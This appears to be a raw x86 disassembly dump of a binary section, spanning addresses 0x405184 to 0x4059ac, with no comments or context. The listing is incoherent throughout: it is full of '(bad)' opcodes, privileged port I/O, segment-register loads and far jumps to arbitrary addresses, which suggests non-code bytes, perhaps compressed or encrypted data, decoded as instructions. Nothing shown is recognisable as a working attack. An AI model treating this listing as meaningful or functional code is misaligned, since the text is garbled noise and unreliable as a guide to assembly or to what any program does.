  405184:	fstp   TBYTE PTR [esp+ecx*4+0x61]
  405188:	sbb    ah,dl
  40518a:	sub    eax,0x7e29c459
  40518f:	adc    al,0x63
  405191:	ins    BYTE PTR es:[edi],dx
  405192:	lock xchg esi,eax
  405194:	cmp    ecx,0x4d196dea
  40519a:	scas   eax,DWORD PTR es:[edi]
  40519b:	imul   ebx,DWORD PTR [ebx],0x7ba12a1e
  4051a1:	aad    0x15
  4051a3:	sti    
  4051a4:	pop    ebp
  4051a5:	sar    DWORD PTR [edi],1
  4051a7:	adc    al,0x9c
  4051a9:	mov    al,ds:0xcc724c1a
  4051ae:	shl    BYTE PTR [ebx-0x505cb25d],0x68
  4051b5:	les    ecx,FWORD PTR [ecx-0x5a]
  4051b8:	push   cs
  4051b9:	mov    ds,WORD PTR [edx]
  4051bb:	in     al,0x5e
  4051bd:	inc    eax
  4051be:	push   0xffffffae
  4051c0:	(bad)  
  4051c2:	(bad)  
  4051c3:	jge    0x40518d
  4051c5:	pop    es
  4051c6:	xchg   esp,eax
  4051c7:	jbe    0x40518f
  4051c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051ca:	jecxz  0x4051a8
  4051cc:	shl    DWORD PTR [edx+edx*8+0xf5717ef],1
  4051d3:	fbstp  TBYTE PTR [ebp-0x2c132c4d]
  4051d9:	and    DWORD PTR [esi+0x3c9a1415],eax
  4051df:	call   0x92686647
  4051e4:	add    al,0xe4
  4051e6:	mov    edx,0xae190156
  4051eb:	jns    0x40526c
  4051ed:	test   BYTE PTR [edx+0xa8fbb32],dh
  4051f3:	push   ss
  4051f4:	xchg   edx,eax
  4051f5:	ja     0x405237
  4051f7:	sub    bl,dh
  4051f9:	sub    BYTE PTR [ecx-0xa],bh
  4051fc:	mov    ds,WORD PTR [eax-0x424f82e1]
  405202:	adc    al,0xf3
  405204:	mov    bh,0xf8
  405206:	push   edx
  405207:	or     BYTE PTR [ebp-0x42232add],ch
  40520d:	call   0xcf32:0xd21ce745
  405214:	cmp    DWORD PTR [ebx],edi
  405216:	stos   DWORD PTR es:[edi],eax
  405217:	mov    BYTE PTR [eax-0x2e],cl
  40521a:	push   edi
  40521b:	rcl    DWORD PTR [edx],1
  40521d:	add    ecx,DWORD PTR [eax+0x3f5424bb]
  405223:	dec    esi
  405224:	jns    0x4051f6
  405226:	fiadd  DWORD PTR [esi]
  405228:	(bad)  [edi+0x39]
  40522b:	clc    
  40522c:	adc    BYTE PTR [ebp-0x48],bl
  40522f:	pop    edx
  405230:	dec    edi
  405231:	push   esp
  405232:	fist   WORD PTR [ebx]
  405234:	ins    DWORD PTR es:[edi],dx
  405235:	pop    ecx
  405236:	ins    DWORD PTR es:[edi],dx
  405237:	lahf   
  405238:	mov    ah,0x3
  40523a:	push   edi
  40523b:	inc    ebp
  40523c:	dec    ebx
  40523d:	call   0xd8a:0x7a4de8f2
  405244:	ja     0x40526c
  405246:	pop    es
  405247:	sahf   
  405248:	sbb    eax,0x73abba3
  40524d:	pop    es
  40524e:	std    
  40524f:	jmp    0x5e25:0x606598b7
  405256:	pop    ebx
  405257:	jnp    0x405205
  405259:	mov    al,ds:0x41e3c355
  40525e:	sbb    BYTE PTR [ebp+0x69],bh
  405261:	ja     0x405228
  405263:	mov    ebp,0x2e750b1e
  405268:	(bad)  
  405269:	fidivr WORD PTR [edx-0x79ed449f]
  40526f:	add    ebx,edx
  405271:	gs aad 0x11
  405274:	mov    ebx,0x2c1d1968
  405279:	imul   ecx,DWORD PTR [ebx-0x37],0x74
  40527d:	xchg   ebp,edi
  40527f:	mov    esp,DWORD PTR [eax-0x25e7eb71]
  405285:	popf   
  405286:	(bad)  
  405287:	xchg   BYTE PTR [eax],bh
  405289:	dec    eax
  40528a:	mov    bh,0x6a
  40528c:	mov    bl,0xf3
  40528e:	inc    edx
  40528f:	xchg   esp,eax
  405290:	jmp    0x4819:0x8985bec4
  405297:	(bad)  
  405298:	dec    edi
  405299:	push   esp
  40529a:	adc    DWORD PTR [edx-0x7fb83b58],edi
  4052a0:	imul   ebx,DWORD PTR [esi],0xffffffb5
  4052a3:	shl    DWORD PTR [ecx],1
  4052a5:	sti    
  4052a6:	fs xchg edx,eax
  4052a8:	addr16 fwait
  4052aa:	add    DWORD PTR [ebp+0x13551ff1],ebp
  4052b0:	push   ss
  4052b1:	pop    es
  4052b2:	std    
  4052b3:	loope  0x40531a
  4052b5:	dec    eax
  4052b6:	dec    esp
  4052b7:	cmc    
  4052b8:	mov    edx,0x36dad74c
  4052bd:	mov    ds:0x7d6d4c07,eax
  4052c2:	jmp    0xa40a:0xc8431d71
  4052c9:	(bad)
  4052cc:	mov    al,dl
  4052ce:	lock repnz ins BYTE PTR es:[edi],dx
  4052d1:	pusha  
  4052d2:	mov    dl,0xd8
  4052d4:	mov    DWORD PTR [ecx],edx
  4052d6:	rcl    BYTE PTR [ebx],1
  4052d8:	mov    bl,0xa9
  4052da:	mov    ds:0x31cfb23b,eax
  4052df:	jbe    0x4052e0
  4052e1:	mov    ebp,0xac75e68
  4052e6:	test   eax,0xe9ef3e52
  4052eb:	pop    ss
  4052ec:	cmp    ch,BYTE PTR [eax+ebp*4]
  4052ef:	ret    
  4052f0:	sub    al,BYTE PTR [ebx+0x23]
  4052f3:	nop
  4052f4:	ja     0x405287
  4052f6:	push   ebx
  4052f7:	pop    edi
  4052f8:	int3   
  4052f9:	loop   0x4052e5
  4052fb:	sahf   
  4052fc:	jp     0x405329
  4052fe:	jecxz  0x405293
  405300:	stc    
  405301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405302:	or     BYTE PTR [esi],al
  405304:	adc    al,0x5a
  405306:	add    BYTE PTR [esi+0x70e31c92],cl
  40530c:	fist   DWORD PTR [esi+0x1d]
  40530f:	adc    BYTE PTR [edx+0x5e09261d],cl
  405315:	mov    ds:0x99446f92,al
  40531a:	sbb    BYTE PTR [ebx*4-0x74e37013],dl
  405321:	mov    esp,0xa0377dac
  405326:	in     al,dx
  405327:	scas   al,BYTE PTR es:[edi]
  405328:	cmc    
  405329:	imul   eax,DWORD PTR [ebx],0xb6af420d
  40532f:	pusha  
  405330:	or     eax,0x71ebb507
  405335:	jecxz  0x405311
  405337:	adc    DWORD PTR [ebx],eax
  405339:	jle    0x405352
  40533b:	outs   dx,DWORD PTR ds:[esi]
  40533c:	aad    0xe0
  40533e:	push   edx
  40533f:	and    ebp,esi
  405341:	jne    0x405341
  405343:	add    edi,0x8f4694a5
  405349:	add    al,0xe2
  40534b:	push   ss
  40534c:	loop   0x405353
  40534e:	and    DWORD PTR [ebx],esp
  405350:	call   edx
  405352:	repz fnstsw WORD PTR [edx]
  405355:	js     0x405374
  405357:	jle    0x4052dd
  405359:	mov    ds:0xd85b92e1,eax
  40535e:	mov    esi,0x8a588fc2
  405363:	or     eax,eax
  405365:	mov    edi,0x8793c84c
  40536a:	(bad)  [ecx-0x25]
  40536d:	jbe    0x40537e
  40536f:	(bad)  [eax+ecx*1-0x5c]
  405373:	ret    0x2315
  405376:	jno    0x405352
  405378:	fimul  WORD PTR [ecx-0x2f]
  40537b:	das    
  40537c:	mov    esp,DWORD PTR [eax+eiz*1-0x154f8552]
  405383:	inc    esp
  405384:	xor    cl,BYTE PTR [edi+0x6abe3890]
  40538a:	lods   al,BYTE PTR ds:[esi]
  40538b:	jne    0x4053f4
  40538d:	jmp    0x2037:0xa876aec8
  405394:	and    BYTE PTR [ecx+edx*1],0x74
  405398:	retf   
  405399:	or     dl,cl
  40539b:	or     eax,0xd9c6aa64
  4053a0:	add    BYTE PTR [edx+0x4933119e],bh
  4053a6:	mov    edx,0xddc4bfea
  4053ab:	call   0xc80b:0x27d313ff
  4053b2:	fist   DWORD PTR [ecx-0x58736f20]
  4053b8:	pop    ds
  4053b9:	xchg   esp,eax
  4053ba:	fwait
  4053bb:	sbb    edi,esp
  4053bd:	imul   ecx,DWORD PTR es:[eax+esi*4],0xffffff98
  4053c2:	scas   al,BYTE PTR es:[edi]
  4053c3:	jo     0x4053ba
  4053c5:	enter  0x735,0xb9
  4053c9:	or     ecx,ebp
  4053cb:	ins    DWORD PTR es:[edi],dx
  4053cc:	fisubr DWORD PTR [esi-0x9801691]
  4053d2:	mov    ebx,0xcaa35561
  4053d7:	out    dx,eax
  4053d8:	pop    esi
  4053d9:	jo     0x4053fd
  4053db:	xchg   esp,eax
  4053dc:	jge    0x405381
  4053de:	mov    eax,ds:0x3b2a8500
  4053e3:	cld    
  4053e4:	mov    dh,BYTE PTR [eax+eax*1-0x4a185887]
  4053eb:	pop    eax
  4053ec:	cmp    DWORD PTR [ebx+eiz*4],ecx
  4053ef:	sahf   
  4053f0:	jno    0x40544b
  4053f2:	dec    edx
  4053f3:	mov    eax,ds:0x972243c7
  4053f8:	retf   0x2519
  4053fb:	push   edx
  4053fc:	test   DWORD PTR [eax-0xf],ecx
  4053ff:	call   0x3423:0x14441dcd
  405406:	dec    esp
  405407:	mov    bl,0x4f
  405409:	push   0xffffffc8
  40540b:	mov    esi,0xd029a79e
  405410:	fsub   QWORD PTR [ebp+0x359a1e1b]
  405416:	pop    ebp
  405417:	mov    ebp,0xbfb4422a
  40541c:	in     eax,dx
  40541d:	xor    al,0xba
  40541f:	(bad)  [edx+0x45]
  405422:	push   0xffffff81
  405424:	sti    
  405425:	dec    edi
  405426:	xor    eax,0x952f9f4e
  40542b:	(bad)  
  40542c:	popa   
  40542d:	mov    dh,0xc0
  40542f:	and    eax,0x9ba6f6ce
  405434:	aad    0xbd
  405436:	iret   
  405437:	rcl    ebp,1
  405439:	cmp    ebp,DWORD PTR [edx-0x2]
  40543c:	scas   al,BYTE PTR es:[edi]
  40543d:	sbb    al,0xbc
  40543f:	fcmovbe st,st(4)
  405441:	repnz lahf 
  405443:	mov    ebx,0x4f69c86
  405448:	pop    ebp
  405449:	into   
  40544a:	popa   
  40544b:	shl    BYTE PTR [eax-0x1b777e0f],0x36
  405452:	pop    ebp
  405453:	inc    edi
  405454:	mov    eax,0x3025b3eb
  405459:	adc    dh,BYTE PTR [ecx]
  40545b:	(bad)  
  40545c:	push   esp
  40545d:	lods   eax,DWORD PTR ds:[esi]
  40545e:	or     DWORD PTR ds:0xd7531454,0x29226927
  405468:	sub    bh,BYTE PTR [edx+eax*2+0x52a83adc]
  40546f:	mov    edx,0x7fb7a771
  405474:	mov    ecx,0x372b2695
  405479:	add    eax,0x520bdeba
  40547e:	(bad)
  405481:	mov    dl,0x39
  405483:	clc    
  405484:	aam    0x69
  405486:	jg     0x40543e
  405488:	push   es
  405489:	add    esi,DWORD PTR ds:0x130814e4
  40548f:	div    BYTE PTR [ebx-0x5ec0ff7b]
  405495:	push   ds
  405496:	mov    edx,0x745df200
  40549b:	adc    DWORD PTR [ebx-0x5c],edx
  40549e:	stos   DWORD PTR es:[edi],eax
  40549f:	dec    esp
  4054a0:	mov    esi,ecx
  4054a2:	daa    
  4054a3:	xchg   edi,eax
  4054a4:	mov    ecx,0xfbd55a2
  4054a9:	rcl    DWORD PTR [ebx],1
  4054ab:	imul   edi,DWORD PTR [eax+edx*4-0x49d010fa],0xa0ab4179
  4054b6:	sahf   
  4054b7:	adc    DWORD PTR ds:0x95a15d01,ebx
  4054bd:	ror    DWORD PTR [edx],cl
  4054bf:	int    0x50
  4054c1:	fiadd  DWORD PTR [eax+0x7195a2a9]
  4054c7:	mov    WORD PTR [esi+0x5681abe3],es
  4054cd:	stc    
  4054ce:	data16 cs cld 
  4054d1:	(bad)  
  4054d2:	out    dx,al
  4054d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054d4:	jne    0x4054b6
  4054d6:	xchg   ebp,eax
  4054d7:	jmp    0x40548e
  4054d9:	add    BYTE PTR [eax-0x6d],ch
  4054dc:	xchg   ecx,eax
  4054dd:	xor    al,0xb0
  4054df:	fld    TBYTE PTR [ebx-0x3b45e971]
  4054e5:	arpl   bx,sp
  4054e7:	mov    al,0x9e
  4054e9:	cmp    eax,ebx
  4054eb:	out    0x6f,eax
  4054ed:	jno    0x405517
  4054ef:	push   esp
  4054f0:	and    al,0x56
  4054f2:	add    ebp,DWORD PTR [ebx-0x2b671b1e]
  4054f8:	adc    BYTE PTR [ecx+0x51d2080a],0xb9
  4054ff:	adc    ecx,DWORD PTR [esi+eax*4+0x39]
  405503:	in     al,0x7d
  405505:	ins    BYTE PTR es:[edi],dx
  405506:	aas    
  405507:	mov    BYTE PTR [ebp+0x21],bh
  40550a:	cmp    al,0xae
  40550c:	mov    bh,BYTE PTR [ebp+0x2c349663]
  405512:	not    BYTE PTR [eax+0x1340d914]
  405518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405519:	stos   DWORD PTR es:[edi],eax
  40551a:	adc    ebx,DWORD PTR [ebp+0x5]
  40551d:	das    
  40551e:	dec    ecx
  40551f:	scas   al,BYTE PTR es:[edi]
  405520:	inc    edi
  405521:	jp     0x405592
  405523:	mov    bl,0xb9
  405525:	cmp    eax,0x716e3cde
  40552a:	and    eax,0x8c8d0a6e
  40552f:	mov    ch,0x71
  405531:	lods   eax,DWORD PTR ds:[esi]
  405532:	daa    
  405533:	(bad)  
  405534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405536:	inc    ecx
  405537:	sub    DWORD PTR [edx+ebx*2+0x11],ebx
  40553b:	mov    ah,BYTE PTR [ebx-0x650961d]
  405541:	scas   al,BYTE PTR es:[edi]
  405542:	(bad)  
  405543:	test   eax,0x4c20e1eb
  405548:	sub    ebp,DWORD PTR ds:0x911f1485
  40554e:	dec    esp
  40554f:	pushf  
  405550:	out    dx,eax
  405551:	aaa    
  405552:	add    BYTE PTR [edx],dh
  405554:	call   0x5d4e:0x4124597
  40555b:	mov    dl,0x8
  40555d:	popf   
  40555e:	sub    al,0x1a
  405560:	sub    dh,ah
  405562:	in     al,dx
  405563:	mov    bl,0x47
  405565:	(bad)  
  405567:	xchg   BYTE PTR [edx],al
  405569:	sbb    esi,DWORD PTR [edi-0x69]
  40556c:	js     0x405500
  40556e:	mov    BYTE PTR [ebx-0x41],ch
  405571:	dec    esi
  405572:	and    esp,ebx
  405574:	hlt    
  405575:	sbb    bh,BYTE PTR ds:[ebp+0x762c887]
  40557c:	test   BYTE PTR [eax+edx*2-0x3afd60c],ah
  405583:	cmp    al,0xa9
  405585:	push   es
  405586:	and    al,0x41
  405588:	add    DWORD PTR [ecx],eax
  40558a:	sbb    al,BYTE PTR [edx+edi*8-0x4bd545c5]
  405591:	adc    dl,BYTE PTR [edx]
  405593:	dec    ebx
  405594:	pop    eax
  405595:	dec    edi
  405596:	mov    ds:0x56c12c4f,eax
  40559b:	cmc    
  40559c:	mov    cl,0x49
  40559e:	mov    ecx,0x540b31c3
  4055a3:	or     BYTE PTR [esi],bh
  4055a5:	jns    0x40558d
  4055a7:	mov    WORD PTR [edx+0x24],gs
  4055aa:	sar    DWORD PTR [ecx],0x36
  4055ad:	(bad)  
  4055ae:	cli    
  4055af:	mov    dh,BYTE PTR [esi+0x75]
  4055b2:	mov    ds:0xcd25f9c3,eax
  4055b7:	jb     0x40556c
  4055b9:	mov    eax,ds:0xd9004a20
  4055be:	std    
  4055bf:	and    edx,DWORD PTR [esi+0x7286a60b]
  4055c5:	test   BYTE PTR [ebp-0x6],bl
  4055c8:	ins    BYTE PTR es:[edi],dx
  4055c9:	cdq    
  4055ca:	sub    BYTE PTR [edx],ch
  4055cc:	and    eax,0x9091dead
  4055d1:	into   
  4055d2:	retf   0x3798
  4055d5:	nop
  4055d6:	push   ebx
  4055d7:	sub    ch,BYTE PTR [eax]
  4055d9:	jg     0x40563b
  4055db:	or     esi,esi
  4055dd:	test   DWORD PTR [eax+0x554f28c7],ebx
  4055e3:	mov    edx,0xfd37b65d
  4055e8:	xchg   esi,eax
  4055e9:	pop    ss
  4055ea:	out    0x5b,al
  4055ec:	jge    0x4055d9
  4055ee:	(bad)  
  4055ef:	arpl   WORD PTR [edx+0xb3491fa],bx
  4055f5:	lock jne 0x4055e4
  4055f8:	test   eax,0x81c82673
  4055fd:	jns    0x40564a
  4055ff:	jae    0x405587
  405601:	xchg   BYTE PTR [esi-0x3f],dh
  405604:	bnd jns 0x40560b
  405607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405608:	icebp  
  405609:	and    BYTE PTR [eax],ch
  40560b:	mov    ch,0xbd
  40560d:	fmul   DWORD PTR [edi+0x66]
  405610:	aad    0xd8
  405612:	xor    ebx,DWORD PTR [ebx+0x69341f17]
  405618:	or     bh,BYTE PTR [ebp+0x4ddd30e0]
  40561e:	or     BYTE PTR [edx],ch
  405620:	mov    esp,0xf43f95eb
  405625:	sahf   
  405626:	mov    eax,0x804c229d
  40562b:	or     eax,0xcfd67eb0
  405630:	xlat   BYTE PTR ds:[ebx]
  405631:	push   ss
  405632:	sbb    al,0x4
  405634:	mov    ebp,0xa8a2858e
  405639:	outs   dx,DWORD PTR ds:[esi]
  40563a:	and    ecx,DWORD PTR [esi+0x5f]
  40563d:	and    eax,0x33c973ab
  405642:	sbb    edx,ecx
  405644:	adc    eax,0xb472f3a7
  405649:	inc    ecx
  40564a:	jmp    0x405663
  40564c:	push   es
  40564d:	sbb    DWORD PTR [eax+0x37],0x36
  405651:	pop    ecx
  405652:	sbb    dh,BYTE PTR [edx+0x6f268e25]
  405658:	sub    esp,0x38
  40565b:	adc    DWORD PTR [esi],esp
  40565d:	retf   
  40565e:	lds    ebx,FWORD PTR ds:0x2d2f4d7c
  405664:	repnz test al,0xc9
  405667:	pop    ecx
  405668:	sub    DWORD PTR [esi+0x13],esi
  40566b:	cmp    ebx,DWORD PTR ds:0x151ca7be
  405671:	mov    ebp,0x811e2b54
  405676:	test   DWORD PTR es:[eax+edx*1+0x75],edx
  40567b:	into   
  40567c:	pop    ds
  40567d:	mov    edx,0x3a52129d
  405682:	cwde   
  405683:	repz repnz fs cmp dl,0xff
  405689:	mov    ebp,0xd3a38932
  40568e:	adc    al,0xdb
  405690:	aam    0x66
  405692:	or     DWORD PTR [edx-0x738c26fc],ebp
  405698:	cs fwait
  40569a:	push   edx
  40569b:	(bad)  
  40569c:	test   eax,0xf22f1217
  4056a1:	add    eax,0x612a4ffa
  4056a6:	pop    eax
  4056a7:	pop    ecx
  4056a8:	arpl   WORD PTR [ebx*1-0x5a97396a],bx
  4056af:	xor    BYTE PTR [ecx],cl
  4056b1:	inc    eax
  4056b2:	mov    BYTE PTR [esi+0xd99a1fc],0xf4
  4056b9:	push   ebp
  4056ba:	loopne 0x405671
  4056bc:	fs and ebp,edx
  4056bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056c1:	ficom  DWORD PTR [ebx-0x67]
  4056c4:	out    0x11,al
  4056c6:	(bad)  
  4056c7:	bound  esi,QWORD PTR [edi]
  4056c9:	sahf   
  4056ca:	xchg   ebx,eax
  4056cb:	shl    DWORD PTR [eax-0x7a],cl
  4056ce:	clc    
  4056cf:	jecxz  0x405729
  4056d1:	inc    ecx
  4056d2:	sbb    BYTE PTR [edx],cl
  4056d4:	adc    DWORD PTR [ecx+0x79ff71f8],ecx
  4056da:	xor    BYTE PTR [ebp+0x65],dh
  4056dd:	mov    bl,0xf0
  4056df:	push   esp
  4056e0:	not    BYTE PTR [ecx+0x5c]
  4056e3:	ror    DWORD PTR [eax+0x45e671bf],cl
  4056e9:	ds aaa 
  4056eb:	inc    ebp
  4056ec:	das    
  4056ed:	(bad)  
  4056ee:	push   edi
  4056ef:	pop    ds
  4056f0:	mov    ds:0xd5f81aad,eax
  4056f5:	loop   0x405752
  4056f7:	arpl   WORD PTR [edi-0x48],bx
  4056fa:	in     eax,dx
  4056fb:	xchg   esi,eax
  4056fc:	test   eax,0x1f55efff
  405701:	inc    esp
  405702:	add    al,0xee
  405704:	mul    dl
  405706:	mov    al,ds:0xa2e30cd3
  40570b:	mov    ecx,0x6ee7066d
  405710:	sbb    BYTE PTR [eax+0x21cce663],bl
  405716:	cli    
  405717:	jns    0x4056bb
  405719:	je     0x405762
  40571b:	sar    BYTE PTR [esi],1
  40571d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40571e:	icebp  
  40571f:	mov    dl,0x77
  405721:	mov    al,0x2f
  405723:	jnp    0x40573a
  405725:	adc    BYTE PTR [eax+eiz*1+0x16],dh
  405729:	test   eax,0xd29a685f
  40572e:	or     BYTE PTR [ebp+0x43922cb0],ch
  405734:	ja     0x405780
  405736:	mov    ah,cl
  405738:	lea    edi,[ebx+0x9b6a919]
  40573e:	shl    DWORD PTR [eax+0x6],cl
  405741:	cmp    DWORD PTR [ebp+edi*8-0x22dfe2fb],ebp
  405748:	push   edi
  405749:	sub    DWORD PTR [ecx+0x4e5162c6],ebp
  40574f:	inc    esp
  405750:	add    BYTE PTR [esi+0x36],cl
  405753:	xchg   ebx,eax
  405754:	out    dx,al
  405755:	sahf   
  405756:	jo     0x40570f
  405758:	shl    BYTE PTR [esi+0x12b0bc71],1
  40575e:	jl     0x405722
  405760:	push   edi
  405761:	loop   0x4057c7
  405763:	mov    ch,0xd6
  405765:	and    edx,DWORD PTR [ecx+0x77]
  405768:	fild   QWORD PTR [edx]
  40576a:	clc    
  40576b:	ds mov dl,0xab
  40576e:	adc    DWORD PTR [edx+0x77],esi
  405771:	inc    edi
  405772:	js     0x40576b
  405774:	xor    BYTE PTR [eax-0x14],cl
  405777:	loopne 0x405760
  405779:	mov    bl,0x52
  40577b:	shr    BYTE PTR [ebx-0x5f3e1f34],cl
  405781:	sub    al,0x5c
  405783:	gs dec eax
  405785:	ficomp WORD PTR [ebx+0x57bb9a58]
  40578b:	mov    edx,0x15374f47
  405790:	add    BYTE PTR [eax-0x299a91e],0x8e
  405797:	pop    esp
  405798:	shr    dl,1
  40579a:	aam    0x16
  40579c:	mov    esp,ds
  40579e:	push   edi
  40579f:	or     BYTE PTR [eax-0x34],ch
  4057a2:	je     0x405749
  4057a4:	push   esp
  4057a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057a6:	aas    
  4057a7:	sti    
  4057a8:	jp     0x405732
  4057aa:	xlat   BYTE PTR ds:[ebx]
  4057ab:	cmp    al,0x59
  4057ad:	mov    edi,0x18a889db
  4057b2:	jo     0x4057b3
  4057b4:	in     al,dx
  4057b5:	ficomp DWORD PTR [edi-0x6c]
  4057b8:	jp     0x405756
  4057ba:	loop   0x405749
  4057bc:	pop    ss
  4057bd:	stos   DWORD PTR es:[edi],eax
  4057be:	hlt    
  4057bf:	out    dx,al
  4057c0:	repnz cli 
  4057c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057c3:	call   0x7603ef5f
  4057c8:	sub    dl,BYTE PTR [edx]
  4057ca:	jno    0x4057e8
  4057cc:	add    ebx,DWORD PTR [ebx-0x15]
  4057cf:	sub    BYTE PTR [edi+0x26],0x7f
  4057d3:	inc    eax
  4057d4:	sti    
  4057d5:	jb     0x40584b
  4057d7:	repnz mov dl,0x75
  4057da:	js     0x40583c
  4057dc:	mov    edi,0xa83ef67e
  4057e1:	popa   
  4057e2:	xor    al,0xd
  4057e4:	pop    esi
  4057e5:	cmp    al,0x40
  4057e7:	(bad)  
  4057e8:	loope  0x405852
  4057ea:	pop    ebx
  4057eb:	add    eax,0x931a9388
  4057f0:	aaa    
  4057f1:	rcl    DWORD PTR [edx],0x1d
  4057f4:	add    al,0x36
  4057f6:	pushf  
  4057f7:	sub    ebp,0x4742e2a6
  4057fd:	(bad)  
  4057fe:	mov    dl,0xb7
  405800:	and    edi,DWORD PTR [ebx-0x273ccf5]
  405806:	lock in eax,0x61
  405809:	mov    ecx,0x11b11107
  40580e:	push   ebx
  40580f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405810:	add    esi,DWORD PTR [ebx-0x7a4fda16]
  405816:	in     eax,dx
  405817:	jb     0x405843
  405819:	(bad)  
  40581a:	test   eax,0xfbe177bc
  40581f:	mov    edx,DWORD PTR [eax+ebx*1]
  405822:	idiv   bl
  405824:	sub    bh,bl
  405826:	sub    DWORD PTR [ebx-0x66166015],esp
  40582c:	aam    0xcd
  40582e:	inc    ebx
  40582f:	and    BYTE PTR [edi+0x4e],cl
  405832:	fmul   st,st(5)
  405834:	in     al,0xc
  405836:	mov    ecx,0xa28b2b24
  40583b:	jb     0x405838
  40583d:	cmp    DWORD PTR [ecx+0x631d2d3a],0xffffffc7
  405844:	outs   dx,BYTE PTR ds:[esi]
  405845:	and    DWORD PTR [ebp-0x17],edi
  405848:	lods   eax,DWORD PTR ds:[esi]
  405849:	inc    edx
  40584a:	dec    edx
  40584b:	sbb    al,0xb1
  40584d:	ror    ecx,cl
  40584f:	repnz iret 
  405851:	adc    BYTE PTR [ebp+0x54],bh
  405854:	add    ecx,DWORD PTR [ecx-0x2c053d86]
  40585a:	aad    0x3d
  40585c:	ret    0xcaae
  40585f:	xchg   ebx,eax
  405860:	lock and bh,0x3d
  405864:	les    eax,FWORD PTR [eax+eax*8-0x11]
  405868:	ins    BYTE PTR es:[edi],dx
  405869:	and    BYTE PTR [esi+0x3f],al
  40586c:	xchg   ebx,eax
  40586d:	adc    eax,0xbaa4818
  405872:	jmp    0x3e7cff97
  405877:	test   al,0x61
  405879:	cdq    
  40587a:	inc    edx
  40587b:	and    dl,bl
  40587d:	xchg   bx,ax
  40587f:	js     0x4058d5
  405881:	cmp    eax,0x860a874a
  405886:	mov    ebx,0xe483b601
  40588b:	sub    BYTE PTR [ebp-0x48],dl
  40588e:	(bad)  
  40588f:	inc    ebp
  405890:	loope  0x40590e
  405892:	cs jbe 0x405870
  405895:	jge    0x4058ea
  405897:	sar    DWORD PTR ds:0x60d71393,0xa
  40589e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40589f:	fdiv   DWORD PTR [esp+edx*4-0xb2ff5d]
  4058a6:	call   0x2980:0xa4088aa4
  4058ad:	mov    ecx,0x9c8fe412
  4058b2:	sbb    eax,0x7194170c
  4058b7:	(bad)  
  4058b8:	fist   DWORD PTR [ebp+0x63]
  4058bb:	push   0x7839a655
  4058c0:	mov    edi,0xf55622a6
  4058c5:	int3   
  4058c6:	retf   
  4058c7:	pusha  
  4058c8:	arpl   WORD PTR [esi],bx
  4058ca:	mov    al,ds:0xecc56c3a
  4058cf:	mov    edi,0xfced20a
  4058d4:	leave  
  4058d5:	loope  0x4058f3
  4058d7:	dec    esi
  4058d8:	outs   dx,BYTE PTR ds:[esi]
  4058d9:	sbb    BYTE PTR [ecx+0x1f],al
  4058dc:	inc    ecx
  4058dd:	cld    
  4058de:	mov    cs,WORD PTR [ecx]
  4058e0:	(bad)  
  4058e1:	sub    al,0xc9
  4058e3:	jl     0x4058ba
  4058e5:	dec    eax
  4058e6:	inc    edi
  4058e7:	into   
  4058e8:	pop    es
  4058e9:	enter  0xbd82,0xb2
  4058ed:	xor    BYTE PTR [ecx+0x2c9207db],0xac
  4058f4:	dec    ebx
  4058f5:	frstor [ebx]
  4058f7:	shl    BYTE PTR ds:0x3eb48b88,cl
  4058fd:	aam    0xb
  4058ff:	js     0x40590c
  405901:	sbb    BYTE PTR fs:[ebx+edi*4-0x78],ch
  405906:	dec    edi
  405907:	push   esp
  405908:	adc    ch,BYTE PTR [ebp+0x5ce5fa41]
  40590e:	push   edi
  40590f:	mov    esp,0x309bb30e
  405914:	hlt    
  405915:	test   DWORD PTR [ebp-0x7c],ebx
  405918:	jg     0x405933
  40591a:	mov    edx,0x97266851
  40591f:	xchg   esp,eax
  405920:	ss push 0x8d163ef0
  405926:	add    eax,0xa35014c2
  40592b:	jecxz  0x4058fa
  40592d:	arpl   WORD PTR [ebx+ecx*2-0x5b],cx
  405931:	cld    
  405932:	repnz push esp
  405934:	bound  esi,QWORD PTR [eax]
  405936:	xchg   ebx,eax
  405937:	add    DWORD PTR [ecx+0x3e],0xffffff81
  40593b:	xchg   DWORD PTR [esi+0x6f9d2037],esp
  405941:	cs push esp
  405943:	sti    
  405944:	fwait
  405945:	xchg   edi,eax
  405946:	mov    ss,WORD PTR [ebx-0x28548aab]
  40594c:	clc    
  40594d:	fimul  DWORD PTR [eax+edi*4]
  405950:	outs   dx,BYTE PTR ds:[esi]
  405951:	push   esp
  405952:	fwait
  405953:	jbe    0x405951
  405955:	or     edx,DWORD PTR [esi]
  405957:	and    eax,0xaed72c0a
  40595c:	adc    ebx,DWORD PTR [ecx]
  40595e:	aas    
  40595f:	mov    ebp,0xedc2ebd3
  405964:	loope  0x40592f
  405966:	push   ecx
  405967:	outs   dx,BYTE PTR ds:[esi]
  405968:	mov    esp,0xbf809d8a
  40596d:	xor    al,0xe
  40596f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405970:	mov    DWORD PTR [edx+0x6c17b992],ebp
  405976:	dec    esi
  405977:	fidiv  WORD PTR [edi+0x57]
  40597a:	mov    bl,0x99
  40597c:	mov    ch,0xcd
  40597e:	adc    esi,DWORD PTR [ebx-0x41]
  405981:	cli    
  405982:	daa    
  405983:	push   ss
  405984:	inc    eax
  405985:	aam    0x4
  405987:	xchg   ebp,eax
  405989:	or     al,0xf
  40598b:	imul   eax,DWORD PTR [edx-0x67],0xffffffc9
  40598f:	rcl    DWORD PTR [ecx],0x66
  405992:	mov    ch,al
  405994:	pop    DWORD PTR [ebx]
  405996:	jecxz  0x405967
  405998:	jnp    0x4059e0
  40599a:	inc    ebx
  40599b:	ret    
  40599c:	fidivr WORD PTR [ebx+0x2b]
  40599f:	ss out 0x1c,eax
  4059a2:	cmp    DWORD PTR [esi+esi*8],0xb7495e34
  4059a9:	push   ecx
  4059aa:	fwait
  4059ab:	inc    esi
  4059ac:	jmp    0xcf9af2
